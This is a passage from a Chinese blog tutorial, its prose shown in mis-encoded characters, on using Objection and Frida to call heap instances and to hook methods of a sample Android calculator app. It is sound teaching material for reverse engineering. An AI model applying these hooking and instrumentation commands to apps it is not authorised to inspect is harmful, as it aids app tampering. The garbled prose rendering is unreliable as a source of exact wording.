&lt;classname&gt;</code></p><p>è¿™é‡Œä»ä»¥<code>java.io.File</code>ç±»ä¸ºä¾‹ï¼Œæœç´¢åˆ°å¾ˆå¤š<code>File</code>çš„å®ä¾‹ï¼Œå¹¶ä¸”æ‰“å°å‡ºå¯¹åº”çš„<code>Handle</code>å’Œ<code>toString()</code>çš„ç»“æœã€‚</p><p>ä¸‹å›¾ä¸­æ˜¾ç¤ºçš„<code>Hashcode</code>ååˆ†é‡è¦ï¼Œåœ¨ä¹‹åçš„ä¸»åŠ¨è°ƒç”¨ä¸­éƒ½æ˜¯ä»¥è¿™ä¸ªå€¼ä½œä¸ºå®ä¾‹çš„å¥æŸ„æ¥è°ƒç”¨å’Œæ‰§è¡Œå‡½æ•°ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323215320587.png" alt="image-20250323215320587"></p><h4 id="2ã€Objectionä¸­è°ƒç”¨å®ä¾‹æ–¹æ³•çš„ä¸¤ç§æ–¹æ³•">2ã€Objectionä¸­è°ƒç”¨å®ä¾‹æ–¹æ³•çš„ä¸¤ç§æ–¹æ³•</h4><h5 id="ç¬¬ä¸€ç§ï¼šä½¿ç”¨execute">ç¬¬ä¸€ç§ï¼šä½¿ç”¨execute</h5><p><code>android heap execute &lt;Hashcode&gt; &lt;methodname&gt;</code></p><p>è¿™é‡Œçš„å®ä¾‹æ–¹æ³•æŒ‡çš„æ˜¯<strong>æ²¡æœ‰å‚æ•°çš„å®ä¾‹æ–¹æ³•</strong>ã€‚ä¸‹é¢æ¼”ç¤ºä¸€ä¸‹ä½¿ç”¨<code>Hashcode</code>å€¼ä¸º<code>31598268</code>æ‰€å¯¹åº”çš„å®ä¾‹æ¥æ‰§è¡Œ<code>File</code>çš„<code>getPath</code>æ–¹æ³•ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323221934874.png" alt="image-20250323221934874"></p><p>ä½¿ç”¨<code>execute</code>æ‰§è¡Œå¸¦å‚å‡½æ•°ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323222724278.png" alt="image-20250323222724278"></p><h5 id="ç¬¬äºŒç§ï¼šä½¿ç”¨evaluate">ç¬¬äºŒç§ï¼šä½¿ç”¨evaluate</h5><p>å¦‚æœè¦æ‰§è¡Œå¸¦å‚æ•°çš„å‡½æ•°ï¼Œåˆ™éœ€è¦å…ˆæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><p><code>android heap evaluate &lt;Hashcode&gt;</code></p><p>åœ¨è¿›å…¥ä¸€ä¸ªè¿·ä½ ç¼–è¾‘å™¨ç¯å¢ƒåï¼Œè¾“å…¥æƒ³è¦æ‰§è¡Œçš„è„šæœ¬å†…å®¹,ç¡®è®¤ç¼–è¾‘å®Œæˆï¼Œç„¶åæŒ‰Escé”®é€€å‡ºç¼–è¾‘å™¨ï¼Œæœ€åæŒ‰å›è½¦é”®ï¼Œå³ä¼šå¼€å§‹æ‰§è¡Œè¿™è¡Œè„šæœ¬å¹¶è¾“å‡ºç»“æœã€‚è¿™é‡Œçš„è„šæœ¬å†…å®¹å’Œåœ¨ç¼–è¾‘å™¨ä¸­ç›´æ¥ç¼–å†™çš„è„šæœ¬å†…å®¹æ˜¯ä¸€æ ·çš„ï¼ˆä½¿ç”¨<code>File</code>ç±»çš„<code>canWrite()</code>å‡½æ•°å’Œ<code>setWritable()</code>å‡½æ•°è¿›  è¡Œæµ‹è¯•ï¼‰ã€‚</p><p>å…·ä½“å®ç°çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clazz.<span class="title function_">canWrite</span>())</span><br><span class="line">clazz.<span class="title function_">setWritable</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clazz.<span class="title function_">canWrite</span>())</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè„šæœ¬ä¸­ , <code>Objection</code> è®¾å®š<code>clazz</code>ç”¨äºä»£è¡¨<code>Hashcode</code>å€¼ä¸º<code>31598268</code>æ‰€å¯¹åº”çš„å®ä¾‹ï¼ŒåŒæ—¶å‡½æ•°<code>canWrite()</code>ç”¨äºè¿”å›è¿™ä¸ªå®ä¾‹æ‰€æ‰“  å¼€çš„æ–‡ä»¶æ˜¯å¦å¯å†™ã€‚<code>setWritable()</code>å‡½æ•°ç”¨äºä¿®æ”¹å¯¹åº”æ–‡ä»¶æ˜¯å¦å¯å†™çš„å±æ€§ã€‚è„šæœ¬çš„ç¼–è¾‘é¡µé¢å’Œæœ€ç»ˆçš„æ‰§è¡Œæ•ˆæœå¦‚ä¸‹å›¾ã€‚å…¶ä¸­çš„<code>True</code>å’Œ<code>False</code>å±äºè¾“å‡ºçš„ç»“æœã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323223947608.png" alt="image-20250323223947608"></p><p><code>heap evaluate</code>æ—¢å¯ä»¥æ‰§è¡Œæœ‰å‚å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œæ— å‚å‡½æ•°ï¼Œè¿™é‡Œä¸å†æ¼”ç¤ºï¼Œç•™å¾…è¯»è€…è‡ªè¡Œç ”ç©¶ã€‚</p><h3 id="å…­ã€Fridaå¼€å‘æ€æƒ³ğŸŒŸ">å…­ã€Fridaå¼€å‘æ€æƒ³ğŸŒŸ</h3><p>åœ¨ä»‹ç»å®Œ<code>Frida</code>å’Œ<code>Objection</code>åï¼Œå°†åœ¨è¿™ä¸€èŠ‚ä¸­æå‡ºä¸€ä¸ªåœ¨é€†å‘è¿‡ç¨‹ä¸­å¸¸ç”¨çš„å·¥ä½œæ€è·¯ï¼Œé€šå¸¸å°†ä¹‹ç§°ä¸ºâ€œ<code>Frida</code>ä¸‰æ¿æ–§â€ã€‚</p><h4 id="1ã€å®šä½ï¼šObjectionè¾…åŠ©å®šä½">1ã€å®šä½ï¼šObjectionè¾…åŠ©å®šä½</h4><p>ç»è¿‡å‰é¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å‘ç°<code>Objection</code>åœ¨é€†å‘è¿‡ç¨‹ä¸­æœ€å¼ºå¤§çš„åŠŸèƒ½å…¶å®æ˜¯ä»æµ·é‡çš„ä»£ç ä¸­<strong>å¿«é€Ÿå®šä½å…³é”®çš„ç¨‹åºé€»è¾‘</strong>ã€‚<code>Frida</code> éœ€è¦æ¯æ¬¡æ‰‹åŠ¨ç¼–å†™ä»£ç å»<code>Hook</code>ä»é™æ€åˆ†æåˆ°çš„å‡½æ•°ï¼Œè¿›è€Œè§‚å¯Ÿå…¶å‚æ•°å’Œè¿”å›å€¼æ˜¯å¦ä¸éœ€æ±‚ç›¸ç¬¦ï¼Œ<code>Objection</code>å°†å¸¸ç”¨çš„ä¸€äº›åŠŸèƒ½é›†æˆåœ¨ä¸€ èµ·ï¼Œä½¿å¾—é€†å‘å¼€å‘å’Œåˆ†æäººå‘˜åœ¨åˆ†æè¿‡ç¨‹ä¸­ä¸éœ€è¦æµªè´¹ç²¾åŠ›åœ¨ç¼–å†™ä»£ç ä¸Šã€‚</p><p>ä¸‹é¢ä»¥æ ·ä¾‹ç¨‹åº<code>Junior.apk</code>ä¸ºä¾‹ï¼ˆæ ·æœ¬æ¥è‡ªäºã€Š Android  Studioå¼€å‘å®æˆ˜:ä»é›¶åŸºç¡€åˆ°Appä¸Šçº¿(ç¬¬2ç‰ˆ)ã€‹ä¸€ä¹¦ä¸­çš„<code>Junior</code>æ ·ä¾‹ï¼Œæºä»£ç åœ¨è¿™é‡Œ<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>ï¼Œ<code>apk</code>æ–‡ä»¶åœ¨è¿™é‡Œ<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>ã€‚</p><p>ä½¿ç”¨<code>adb install -t junior.apk</code>å‘½ä»¤å°†<code>Junior.apk</code>å®‰è£…å¹¶å¯åŠ¨åï¼Œé¦–å…ˆä½¿ç”¨<code>Objection</code>éå†ä¸€ä¸‹<code>App</code>çš„æ‰€æœ‰<code>activity</code>(æ´»åŠ¨),  å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><code>android hooking list activities</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323231643853.png" alt="image-20250323231643853"></p><p>åœ¨å®‰è£…å’Œéå†<code>App</code>çš„æ‰€æœ‰<code>activity</code>åï¼Œæˆ‘ä»¬ä¼šå‘ç°æ•´ä¸ª<code>App</code>æ€»å…±æœ‰  17ä¸ª<code>activity</code>ï¼Œä¸ºäº†æ–¹ä¾¿è®²è§£ï¼Œè¿™é‡Œé€‰æ‹©åˆ†æçš„ç›®æ ‡<code>activity</code>ä¸ºè®¡ç®—å™¨çš„ç›¸å…³æ´»åŠ¨<code>com.example.junior.CalculatorActivity</code> ï¼Œå¹¶å°è¯•ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å»å¯åŠ¨è¿™ä¸ªæ´»åŠ¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.example.junior <span class="title function_">on</span> <span class="params">(google: <span class="number">13</span>)</span> [usb] # android intent launch_activity com.example.junio</span><br><span class="line">r.CalculatorActivity</span><br><span class="line">(agent) Starting activity com.example.junior.CalculatorActivity...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿæ‰‹æœºé¡µé¢ï¼Œä¼šå‘ç°<code>activity</code>è¢«æˆåŠŸå¯åŠ¨äº†ï¼Œæœ€ç»ˆæ‰‹æœºæ˜¾ç¤ºè®¡ç®—å™¨çš„é¡µé¢ã€‚</p><p>è¿™é‡Œé€‰å–å‡æ³•ä½œä¸ºæˆ‘ä»¬çš„åˆ†æç›®æ ‡,åœ¨è®¡ç®—å™¨æˆåŠŸå¯åŠ¨å,ä»æº  ç åœ°å€ä¸‹è½½å¯¹åº”<code>android2</code>æºç å¹¶ç›´æ¥æŸ¥çœ‹è¿™ä¸ª<code>activity</code>çš„æºç :åˆ‡æ¢  åˆ° <code>android2</code>å·¥ç¨‹ä¸‹ , æ‰“å¼€å¯¹åº”çš„<code>junior/src/main/java/com/example/junior/CalculatorActivity.java</code>æ–‡ä»¶ï¼Œä»è¿™ä¸ªæ–‡ä»¶ä¸­çš„<code>onCreate()</code>å‡½æ•°å¯ä»¥  çœ‹åˆ°æ•´ä¸ªæ´»åŠ¨æ³¨å†Œäº†å¾ˆå¤šæ§ä»¶çš„ç‚¹å‡»äº‹ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// onCreateå‡½æ•°</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_calculator);</span><br><span class="line">        <span class="comment">// ä»å¸ƒå±€æ–‡ä»¶ä¸­è·å–åå«tv_resultçš„æ–‡æœ¬è§†å›¾</span></span><br><span class="line">        tv_result = findViewById(R.id.tv_result);</span><br><span class="line">        <span class="comment">// è®¾ç½®tv_resultå†…éƒ¨æ–‡æœ¬çš„ç§»åŠ¨æ–¹å¼ä¸ºæ»šåŠ¨å½¢å¼</span></span><br><span class="line">        tv_result.setMovementMethod(<span class="keyword">new</span> <span class="title class_">ScrollingMovementMethod</span>());</span><br><span class="line">        <span class="comment">// ä¸‹é¢ç»™æ¯ä¸ªæŒ‰é’®æ§ä»¶éƒ½æ³¨å†Œäº†ç‚¹å‡»ç›‘å¬å™¨</span></span><br><span class="line">        findViewById(R.id.btn_cancel).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œå–æ¶ˆâ€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_divide).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œé™¤æ³•â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_multiply).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œä¹˜æ³•â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_clear).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œæ¸…é™¤â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_seven).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—7</span></span><br><span class="line">        findViewById(R.id.btn_eight).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—8</span></span><br><span class="line">        findViewById(R.id.btn_nine).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—9</span></span><br><span class="line">        findViewById(R.id.btn_plus).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œåŠ æ³•â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_four).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—4</span></span><br><span class="line">        findViewById(R.id.btn_five).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—5</span></span><br><span class="line">        findViewById(R.id.btn_six).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—6</span></span><br><span class="line">        findViewById(R.id.btn_minus).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œå‡æ³•â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_one).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—1</span></span><br><span class="line">        findViewById(R.id.btn_two).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—2</span></span><br><span class="line">        findViewById(R.id.btn_three).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—3</span></span><br><span class="line">        findViewById(R.id.btn_zero).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// æ•°å­—0</span></span><br><span class="line">        findViewById(R.id.btn_dot).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œå°æ•°ç‚¹â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.btn_equal).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œç­‰å·â€æŒ‰é’®</span></span><br><span class="line">        findViewById(R.id.ib_sqrt).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// â€œå¼€å¹³æ–¹â€æŒ‰é’®</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>éšä¾¿æµ‹è¯•è¿™ä¸ªè®¡ç®—å™¨ä¹‹åä¼šå‘ç°,æ¯æ¬¡æŒ‰â€œç­‰å·â€æŒ‰é’®åè®¡ç®—ç»“æœéƒ½ä¼šè¢«æ‰“å°å‡ºæ¥ã€‚æ ¹æ®è¿™ä¸€ç°è±¡ï¼Œæ‰¾åˆ°å¯¹åº”â€œç­‰å·â€æŒ‰é’®çš„<code>id</code>ä¸º<code>btn_equal</code>ï¼Œå¹¶æ ¹æ®è¿™ä¸ª<code>id</code>æ‰¾åˆ°å¯¹åº”çš„ç‚¹å‡»å“åº”å‡½æ•°<code>onClick</code>å‡½æ•°ä¸­å±äºâ€œç­‰å·â€æŒ‰é’®çš„æºç éƒ¨åˆ†ï¼Œæœ€ç»ˆçš„æºç å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//onClickå‡½æ•°</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">resid</span> <span class="operator">=</span> v.getId(); <span class="comment">// è·å¾—å½“å‰æŒ‰é’®çš„ç¼–å·</span></span><br><span class="line">        ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resid == R.id.btn_equal) &#123; <span class="comment">// ç‚¹å‡»äº†ç­‰å·æŒ‰é’®</span></span><br><span class="line">            <span class="keyword">if</span> (operator.length() == <span class="number">0</span> || operator.equals(<span class="string">&quot;ï¼&quot;</span>)) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;è¯·è¾“å…¥è¿ç®—ç¬¦&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nextNum.length() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;è¯·è¾“å…¥æ•°å­—&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (caculate()) &#123; <span class="comment">// è®¡ç®—æˆåŠŸï¼Œåˆ™æ˜¾ç¤ºè®¡ç®—ç»“æœ</span></span><br><span class="line">                operator = inputText;</span><br><span class="line">                showText = showText + <span class="string">&quot;=&quot;</span> + result;</span><br><span class="line">                tv_result.setText(showText);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// è®¡ç®—å¤±è´¥ï¼Œåˆ™ç›´æ¥è¿”å›</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä»<code>onClick</code>å‡½æ•°ä¸­å¯ä»¥å‘ç°æœ€ç»ˆçœŸå®çš„ç‚¹å‡»â€œç­‰å·â€æŒ‰é’®åçš„ä¸»è¦ä»£ç åœ¨<code>caculate()</code>å‡½æ•°ä¸­ã€‚æ¥ä¸‹æ¥å°±æ˜¯éªŒè¯æˆ‘ä»¬æƒ³æ³•çš„æ—¶å€™äº†ï¼šä¸ºäº†é˜²æ­¢æºç å’ŒçœŸå®è¿è¡Œä»£ç ä¸åŒï¼Œå…ˆä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éªŒè¯æ˜¯å¦å­˜åœ¨<code>caculate()</code>å‡½æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">com.example.junior <span class="title function_">on</span> <span class="params">(google: <span class="number">13</span>)</span> [usb] # android hooking list class_methods com.example.j</span><br><span class="line">unior.CalculatorActivity</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> com.example.junior.CalculatorActivity.caculate()</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> com.example.junior.CalculatorActivity.clear(java.lang.String)</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> com.example.junior.CalculatorActivity.onCreate(android.os.Bundle)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> com.example.junior.CalculatorActivity.onClick(android.view.View)</span><br><span class="line"></span><br><span class="line">Found <span class="number">4</span> method(s)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ‰§è¡Œç»“æœè¯´æ˜<code>caculate()</code>å‡½æ•°ç¡®å®æ˜¯å­˜åœ¨çš„ã€‚</p><p>æ¥ä¸‹æ¥å°±å¾ˆæ˜æ˜¾äº†ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤<code>Hook</code>è¿™ä¸ªå‡½æ•°æ¥ç¡®è®¤åœ¨ç‚¹å‡»  â€œç­‰å·â€æŒ‰é’®åè¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨äº†ã€‚åœ¨<code>Hook</code>ä¸Šåï¼Œä»»æ„è¾“å…¥ä¸€ä¸ªè¡¨è¾¾å¼å¹¶ç‚¹å‡»â€œç­‰å·â€æŒ‰é’®ï¼Œä¼šå‘ç°è¿™ä¸ªå‡½æ•°åœ¨ç‚¹å‡»â€œç­‰å·â€æŒ‰é’®åè¢«è°ƒç”¨ï¼Œ<code>Hook</code>ç»“æœå¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.example.junior <span class="title function_">on</span> <span class="params">(google: <span class="number">13</span>)</span> [usb] # android hooking watch class_method com.example</span><br><span class="line">.junior.CalculatorActivity.caculate --dump-args --dump-backtrace --dump-<span class="keyword">return</span></span><br><span class="line">(agent) Attempting to watch <span class="keyword">class</span> <span class="title class_">com</span>.example.junior.CalculatorActivity and method caculate.</span><br><span class="line">(agent) Hooking com.example.junior.CalculatorActivity.caculate()</span><br><span class="line">(agent) Registering job <span class="number">658110.</span> Type: watch-method <span class="keyword">for</span>: com.example.junior.CalculatorActivity.caculate</span><br></pre></td></tr></table></figure><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324145106214.png" alt="image-20250324145106214"></p><p>æŸ¥æ‰¾ä»£ç ï¼Œæ‰¾åˆ°äº†å…¶ä¸­çš„çš„<code>caculate()</code>å‡½æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼€å§‹åŠ å‡ä¹˜é™¤å››åˆ™è¿ç®—ï¼Œè®¡ç®—æˆåŠŸåˆ™è¿”å›trueï¼Œè®¡ç®—å¤±è´¥åˆ™è¿”å›false</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">caculate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (operator.equals(<span class="string">&quot;ï¼‹&quot;</span>)) &#123; <span class="comment">// å½“å‰æ˜¯ç›¸åŠ è¿ç®—</span></span><br><span class="line">        result = String.valueOf(Arith.add(firstNum, nextNum));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operator.equals(<span class="string">&quot;ï¼&quot;</span>)) &#123; <span class="comment">// å½“å‰æ˜¯ç›¸å‡è¿ç®—</span></span><br><span class="line">        result = String.valueOf(Arith.sub(firstNum, nextNum));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operator.equals(<span class="string">&quot;Ã—&quot;</span>)) &#123; <span class="comment">// å½“å‰æ˜¯ç›¸ä¹˜è¿ç®—</span></span><br><span class="line">        result = String.valueOf(Arith.mul(firstNum, nextNum));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operator.equals(<span class="string">&quot;Ã·&quot;</span>)) &#123; <span class="comment">// å½“å‰æ˜¯ç›¸é™¤è¿ç®—</span></span><br><span class="line">        <span class="keyword">if</span> (Double.parseDouble(nextNum) == <span class="number">0</span>) &#123; <span class="comment">// å‘ç°é™¤æ•°æ˜¯0</span></span><br><span class="line">            <span class="comment">// é™¤æ•°ä¸º0ï¼Œè¦å¼¹çª—æç¤ºç”¨æˆ·</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;é™¤æ•°ä¸èƒ½ä¸ºé›¶&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="comment">// è¿”å›falseè¡¨ç¤ºè¿ç®—å¤±è´¥</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// é™¤æ•°é0ï¼Œåˆ™è¿›è¡Œæ­£å¸¸çš„é™¤æ³•è¿ç®—</span></span><br><span class="line">            result = String.valueOf(Arith.div(firstNum, nextNum));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æŠŠè¿ç®—ç»“æœæ‰“å°åˆ°æ—¥å¿—ä¸­</span></span><br><span class="line">    Log.d(TAG, <span class="string">&quot;result=&quot;</span> + result);</span><br><span class="line">    firstNum = result;</span><br><span class="line">    nextNum = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// è¿”å›trueè¡¨ç¤ºè¿ç®—æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå¯¹å‡æ³•çš„å¤„ç†æ˜¯é€šè¿‡è°ƒç”¨<code>Arith</code>ç±»ä¸­çš„<code>sub()</code>å‡½æ•°æ¥å®ç°çš„ã€‚ä¸ºäº†éªŒè¯<code>Arith</code>ç±»åœ¨å†…å­˜ä¸­æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ä»¥ä¸‹<code>Objection</code>å‘½ä»¤æ¥è·å–ä¸€ä¸ªåº”ç”¨åœ¨å†…å­˜ä¸­çš„æ‰€æœ‰ç±»ã€‚</p><p><code># android hooking list classes</code></p><p>é€šå¸¸ï¼Œåœ¨è¿è¡Œè¿™è¡Œå‘½ä»¤åä¼šåˆ—å‡ºå¾ˆå¤šç±»ï¼Œç”šè‡³ä¼šè¶…è¿‡æ•´ä¸ª<code>Terminal</code>ç¼“å­˜ç©ºé—´ï¼Œè¿™æ—¶ä¼šå‡ºç°ä¸€äº›ç±»è¢«ç¼“å­˜å†²åˆ·æ‰çš„æƒ…å†µï¼Œå¦‚æœåªæ˜¯ç®€å•åœ°åœ¨ç»ˆç«¯çª—å£é‡ŒæŸ¥æ‰¾ï¼Œé‚£ä¹ˆä¸ä¸€å®šèƒ½æ‰¾åˆ°ã€‚å…¶å®<code>Objection</code>æœ¬èº«æœ‰ä¸€ä¸ª<code>log</code>æ–‡ä»¶ï¼Œç”¨äºè®°å½•<code>objection</code>è¿è¡Œæ—¶äº§ç”Ÿçš„æ‰€æœ‰æ•°æ®ã€‚è¿™ä¸ªæ—¥å¿—æ•°æ®å­˜æ”¾åœ¨<code>~/.objection</code>ç›®å½•ä¸‹çš„<code>objection.log</code>æ–‡ä»¶ä¸­ã€‚</p><p><strong>è§£å†³æ–¹æ³•</strong>ï¼šåœ¨è¿è¡Œ<code>objection</code>æ³¨å…¥<code>App</code>ä¹‹å‰ï¼Œé¦–å…ˆåˆ‡æ¢åˆ°<code>~/.objection</code>ç›®å½•ä¸‹ï¼Œå°†ä¹‹å‰çš„<code>objection.log</code>æ–‡ä»¶åˆ é™¤æˆ–è€…æ”¹åã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324150259874.png" alt="image-20250324150259874"></p><p>åœ¨åˆ é™¤è¿™ä¸ª<code>log</code>æ–‡ä»¶åé‡æ–°æ³¨å…¥<code>App</code>ï¼Œå¹¶é‡æ–°éå†åº”ç”¨åœ¨å†…å­˜ä¸­çš„æ‰€æœ‰ç±»ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ³¨å…¥åº”ç”¨</span></span><br><span class="line">objection -g junior explore</span><br><span class="line"><span class="meta prompt_"># </span><span 